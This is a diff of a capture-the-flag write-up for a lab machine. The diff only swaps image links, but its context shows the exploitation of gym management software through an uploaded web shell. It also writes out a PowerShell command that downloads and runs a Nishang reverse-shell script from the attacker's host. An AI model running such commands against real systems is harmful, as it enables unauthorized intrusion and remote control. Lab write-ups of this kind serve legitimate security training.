@@ -4,16 +4,16 @@ nmap scan shows that we have 2 ports open, they are 8080,7680
 
 lets browse the 8080 http port first. as we keep navigating the pages, we see there is something here
 
-![](../../.gitbook/assets/image%20%2817%29.png)
+![](../../.gitbook/assets/image%20%2821%29.png)
 
 there is something called a gym management software here, which the first thing we do is searchsploit and it shows us that we have unauthenticated RCE which is the most interested one for us
 
-![](../../.gitbook/assets/image%20%2818%29.png)
+![](../../.gitbook/assets/image%20%2822%29.png)
 
 lets get the python script using `searchsploit -m php/webapps/48506.py`. our exploit script exits without conecting to any web shell as such, but if we look at the script, its making use of this  
 [`http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami`](http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami)\`\`
 
-![](../../.gitbook/assets/image%20%287%29.png)
+![](../../.gitbook/assets/image%20%2817%29.png)
 
 we got a shell kind of thing here, so now, I'm going to use nishang powershell script to get us back a reverse shell
 
@@ -23,7 +23,7 @@ lets host the Nishang `Invoke-PowerShellTcp.ps1` script on our webserver and run
 http://10.10.10.198:8080/upload/kamehameha.php?telepathy=powershell%20%22iex(new-object%20net.webclient).downloadstring(%27http://10.10.14.28/sh.ps1%27)%22
 ```
 
-![reverse shell](../../.gitbook/assets/image%20%2819%29.png)
+![reverse shell](../../.gitbook/assets/image%20%2824%29.png)
 
 we found a `passwords.txt` on the machine
 
